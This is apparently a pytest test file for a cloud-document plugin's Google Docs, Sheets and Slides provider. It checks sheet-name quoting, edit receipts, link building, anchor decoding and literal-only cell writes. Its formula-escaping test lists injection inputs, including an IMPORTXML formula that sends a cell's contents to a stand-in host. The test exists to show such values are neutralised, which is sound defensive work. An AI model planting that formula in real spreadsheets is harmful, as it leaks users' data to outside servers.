"""Google Docs, Sheets and Slides formats: what the Google modules alone decide.

Moved from the plugin's formats tests; the cases that reach the toolkit or the
Feishu modules move with those.
"""
from __future__ import annotations

import pytest

from jiuwenswarm.clouddoc.providers.base import ProviderError

class _Sink:
    def __init__(self):
        self.rows = None

    def begin(self, doc, edits, *, highlight, source="", executor=""):
        self.rows = edits
        return "r1"

    def commit(self, rid, revision_after=None):
        pass

    def abort(self, rid, reason=""):
        pass


class _FakeGoogle:
    """Enough of the provider for a writer to run against, and nothing more."""

    def __init__(self, sink):
        self.receipt_sink = sink
        self.receipt_meta = {}
        self.written = None

    receipt_begin = None  # replaced below

    def receipt_commit(self, rid, rev):
        pass

    def receipt_abort(self, rid, reason):
        pass


def test_a_grouped_text_box_is_not_lost():
    """Slides can nest shapes in groups; text inside one is still text a comment can
    quote, so the walk has to descend into them.
    """
    from jiuwenswarm.clouddoc.providers.google.formats import _shapes_of

    page = {
        "pageElements": [
            {"elementGroup": {"children": [
                {"objectId": "inner", "shape": {"text": {"textElements": [
                    {"textRun": {"content": "buried"}}
                ]}}}
            ]}}
        ]
    }
    assert [s.text for s in _shapes_of(page, "p1", notes=False)] == ["buried"]


def test_no_format_claims_a_lock_it_does_not_have():
    """C9. A spreadsheet has no write precondition available at all -- measured, its
    API carries no revision id anywhere -- and a handler that compensates still says
    False, because admission reads this flag to decide whether concurrency is
    protected.
    """
    from jiuwenswarm.clouddoc.providers.google.formats import TRAITS

    assert TRAITS["spreadsheet"].has_revision_control is False
    assert TRAITS["presentation"].has_revision_control is True
    assert TRAITS["document"].has_revision_control is True


def test_every_format_records_what_it_edited():
    """Not that a receipt happened -- what is in it. The first version of these writers
    passed an empty list here and recorded receipts with no edits, which is the failure
    rings ⑤ and ⑥ are built to prevent and which nothing else would have caught.
    """
    from jiuwenswarm.clouddoc.providers.google.provider import (
        GoogleDocsProvider,
    )

    sink = _Sink()
    prov = _FakeGoogle(sink)
    # Borrow the real recorder: the point is that the writers call it with real edits.
    prov.receipt_begin = GoogleDocsProvider.receipt_begin.__get__(prov)

    prov.receipt_begin("doc", [("old", "new")], highlight=False)
    assert sink.rows == [{"old": "old", "new": "new", "for_comment_ids": []}]

    # And the document path's four-tuple shape still records the same way.
    sink.rows = None
    prov.receipt_begin("doc", [(1, 5, "old", "new")], highlight=False)
    assert sink.rows == [{"old": "old", "new": "new", "for_comment_ids": []}]


def test_a_failing_receipt_sink_refuses_the_write_before_the_platform_call_only():
    """IC-2 splits the write-ahead order in two. ``begin`` runs before the platform
    call: if it fails, nothing has landed, and the write is refused as
    ``ledger_unavailable`` (swallowing it let the write go through untracked).
    ``commit`` and ``abort`` run after: a failure there must not turn a write that
    landed into a reported failure, so those still only log -- the receipt stays
    pending for the sweep to adjudicate.
    """
    from jiuwenswarm.clouddoc.providers.google.provider import (
        GoogleDocsProvider,
    )
    from jiuwenswarm.clouddoc.providers.base import ProviderError

    class Broken:
        def begin(self, *a, **k):
            raise RuntimeError("sink down")

        def commit(self, *a, **k):
            raise RuntimeError("sink down")

        def abort(self, *a, **k):
            raise RuntimeError("sink down")

    prov = object.__new__(GoogleDocsProvider)
    prov.receipt_sink = Broken()
    prov.receipt_meta = {}

    with pytest.raises(ProviderError) as info:
        prov.receipt_begin("d", [("a", "b")], highlight=False)
    assert info.value.kind == "ledger_unavailable"
    prov.receipt_commit("r1", "rev")
    prov.receipt_abort("r1", "reason")


def test_a_sheet_name_needing_quotes_gets_them():
    """A1 notation rejects an unquoted title with a space, and the request fails for the
    whole spreadsheet rather than for that sheet -- so a workbook with a "Q3 Data" tab
    could not be read at all.
    """
    from jiuwenswarm.clouddoc.providers.google.formats import (
        _quote_sheet,
    )

    assert _quote_sheet("Sheet1") == "Sheet1"
    assert _quote_sheet("Q3 Data") == "'Q3 Data'"
    assert _quote_sheet("Bob's") == "'Bob''s'"
    assert _quote_sheet("2024") == "'2024'"


def test_a_cell_address_carries_the_quoting_the_write_needs():
    """The address goes straight back out as the write's A1 range, so a title needing
    quotes would read fine and then fail on write.
    """
    from jiuwenswarm.clouddoc.providers.textmap import Cell, flatten_grid
    from jiuwenswarm.clouddoc.providers.google.formats import _quote_sheet

    addr = f"{_quote_sheet('Q3 Data')}!A1"
    _, segs = flatten_grid([[Cell(address=addr, formatted="x", formula="x")]])
    assert segs[0].address == "'Q3 Data'!A1"


def test_a_link_comes_from_the_provider_not_a_template():
    """The panel and the create-document tool both hand a link to a person, and both
    built it as a Google **document** URL -- wrong for every Feishu document and for
    every Google spreadsheet and deck.
    """
    from jiuwenswarm.clouddoc.providers.google.provider import (
        GoogleDocsProvider,
    )

    prov = object.__new__(GoogleDocsProvider)
    prov._kind_cache = {}
    assert "/spreadsheets/" in prov.doc_url("X", "spreadsheet")
    assert "/presentation/" in prov.doc_url("X", "presentation")
    assert "/document/" in prov.doc_url("X", "document")
    # An unknown kind gets the Drive file view, which opens every type, rather than the
    # document editor, which opens one.
    assert "drive.google.com" in prov.doc_url("X", "")


def test_a_shape_anchor_decodes_to_region_addresses():
    """Measured live: {"type":"shape","page":P,"targets":[T]} is the pageId/objectId
    address the region machinery writes through. The 'anchors are opaque' verdict was
    a per-format fact -- true of a spreadsheet's workbook-range, false here.
    """
    from jiuwenswarm.clouddoc.providers.google.provider import (
        GoogleDocsProvider,
    )

    dec = GoogleDocsProvider._anchor_regions
    assert dec('{"type":"shape","uid":1,"page":"g5_0","targets":["g5_2"]}') == ("g5_0/g5_2",)
    assert dec('{"type":"shape","page":"p","targets":["a","b"]}') == ("p/a", "p/b")
    # The opaque ones stay opaque, quietly.
    assert dec('{"type":"workbook-range","uid":0,"range":"1896749560"}') == ()
    assert dec("not json") == ()
    assert dec(None) == ()
    assert dec('{"type":"shape","targets":["x"]}') == (), "缺 page 的锚不产地址"


def test_the_blanket_comment_attribution_reaches_every_edit():
    """A region write's old is computed by the provider, so keying attribution by old
    text cannot work there; the blanket list must land on each edit, or the receipt of a
    comment-commissioned region write names no thread at all.
    """
    from jiuwenswarm.clouddoc.providers.google.provider import (
        GoogleDocsProvider,
    )

    begun = {}

    class _Sink:
        def begin(self, doc_id, edits, *, highlight, source="", executor=""):
            begun["edits"] = edits
            return "r1"

    prov = type("P", (), {})()
    prov.receipt_sink = _Sink()
    prov.receipt_meta = {"for_comment_ids": ["c9"], "executor": "comment:c9"}
    bound = GoogleDocsProvider.receipt_begin.__get__(prov)
    bound("doc", [("旧", "新")], highlight=False, regions=[("p/a", [["旧"]])])
    (e,) = begun["edits"]
    assert e["for_comment_ids"] == ["c9"]
    assert e["region"] == "p/a" and e["old_grid"] == [["旧"]]


@pytest.mark.asyncio
async def test_a_markdown_row_left_over_from_before_refuses_rather_than_reading_as_a_doc():
    """The panel's persisted metadata primes the format cache on every restart, so a
    document adopted while markdown was served keeps answering "markdown" for as long
    as its row exists. The reader falls through to the Google **document** API for a
    kind it has no reader for, so without this gate the file would be read as a Doc
    and the person would see the platform's confusion rather than our answer.
    """
    from jiuwenswarm.clouddoc.providers.google.provider import (
        GoogleDocsProvider,
    )

    prov = object.__new__(GoogleDocsProvider)
    prov._kind_cache = {"F": "markdown"}
    with pytest.raises(ProviderError) as exc:
        await prov._require_kind("F")
    assert "不支持" in str(exc.value)

    # An *unresolved* kind is a different thing and must not be caught here: it is
    # what a bare token answers before the first read teaches the format.
    from jiuwenswarm.clouddoc.providers.base import (
        is_supported_kind,
    )
    assert is_supported_kind("") is True
    assert is_supported_kind("markdown") is False


def test_a_withdrawn_format_still_offers_a_link_the_platform_serves():
    """The row stays, so the link has to keep working -- and it has to be the one
    Drive actually serves.

    This is a regression with a screenshot. Dropping markdown's entry let it fall
    through to the ``/preview`` fallback, on the reasoning that the fallback "opens
    every type". It does not: for a text/markdown file Drive's API returns ``/view``
    as the webViewLink, and ``/preview`` answers with the "You need access" page
    **to the file's owner** -- accusing the reader of a permission problem they do
    not have. Verified against the live API on the owner's own file.
    """
    from jiuwenswarm.clouddoc.providers.google.provider import (
        GoogleDocsProvider,
    )

    prov = object.__new__(GoogleDocsProvider)
    prov._kind_cache = {}
    assert prov.doc_url("F", "markdown") == "https://drive.google.com/file/d/F/view"
    # And the fallback for a kind that resolved to nothing at all is the same
    # address, for the same reason: it is only ever reached by a format the
    # workbench does not embed, so there is nothing left to trade /view away for.
    assert prov.doc_url("F", "") == "https://drive.google.com/file/d/F/view"


# ------------------------- a write never creates a formula


@pytest.mark.parametrize(
    "value, sent",
    [
        ('=IMPORTXML("https://x.example/?q="&A1, "//a")', '\'=IMPORTXML("https://x.example/?q="&A1, "//a")'),
        ("+HYPERLINK(B2)", "'+HYPERLINK(B2)"),
        ("-- 待定 --", "'-- 待定 --"),
        ("@sum", "'@sum"),
        ("'quoted", "''quoted"),
        ("-5", "-5"),
        ("+3.5%", "+3.5%"),
        ("1,234", "1,234"),
        ("Q3 收入", "Q3 收入"),
        ("", ""),
    ],
)
def test_a_value_that_would_parse_as_a_formula_is_sent_as_text(value, sent):
    """USER_ENTERED keeps numbers numeric, and would also turn a leading ``=`` into a
    formula that runs when the sheet opens. Overwriting a formula is refused (IC-7);
    creating one must not be possible either.
    """
    from jiuwenswarm.clouddoc.providers.google.formats import _as_literal

    assert _as_literal(value) == sent


@pytest.mark.asyncio
async def test_the_cell_write_sends_the_literal_form():
    from jiuwenswarm.clouddoc.providers import textmap
    from jiuwenswarm.clouddoc.providers.base import DocSnapshot
    from jiuwenswarm.clouddoc.providers.google.formats import write_spreadsheet

    text, segs = textmap.flatten_grid(
        [[textmap.Cell(address="S!A1", formatted="合计", formula="合计")]]
    )
    snap = DocSnapshot(doc_id="d", kind="spreadsheet", revision_id=None, text=text,
                       segments=segs)
    sent = {}

    class _Values:
        def values(self):
            return self

        def spreadsheets(self):
            return self

        def batchUpdate(self, **kw):  # noqa: N802 - the SDK's own spelling
            sent.update(kw)
            return self

        def execute(self):
            return {}

    class _Prov:
        receipt_sink = None

        def receipt_begin(self, *a, **k):
            return "r1"

        def receipt_commit(self, *a, **k):
            pass

        def receipt_abort(self, *a, **k):  # pragma: no cover - not this path
            raise AssertionError("a successful write must not abort")

        def sheets_client(self):
            return _Values()

        async def call_api(self, fn):
            return fn()

    out = await write_spreadsheet(_Prov(), "d", snap, [("合计", "=1+1")], None)

    assert out.status == "applied"
    assert sent["body"]["data"][0]["values"] == [["'=1+1"]], "写入内容不应成为公式"
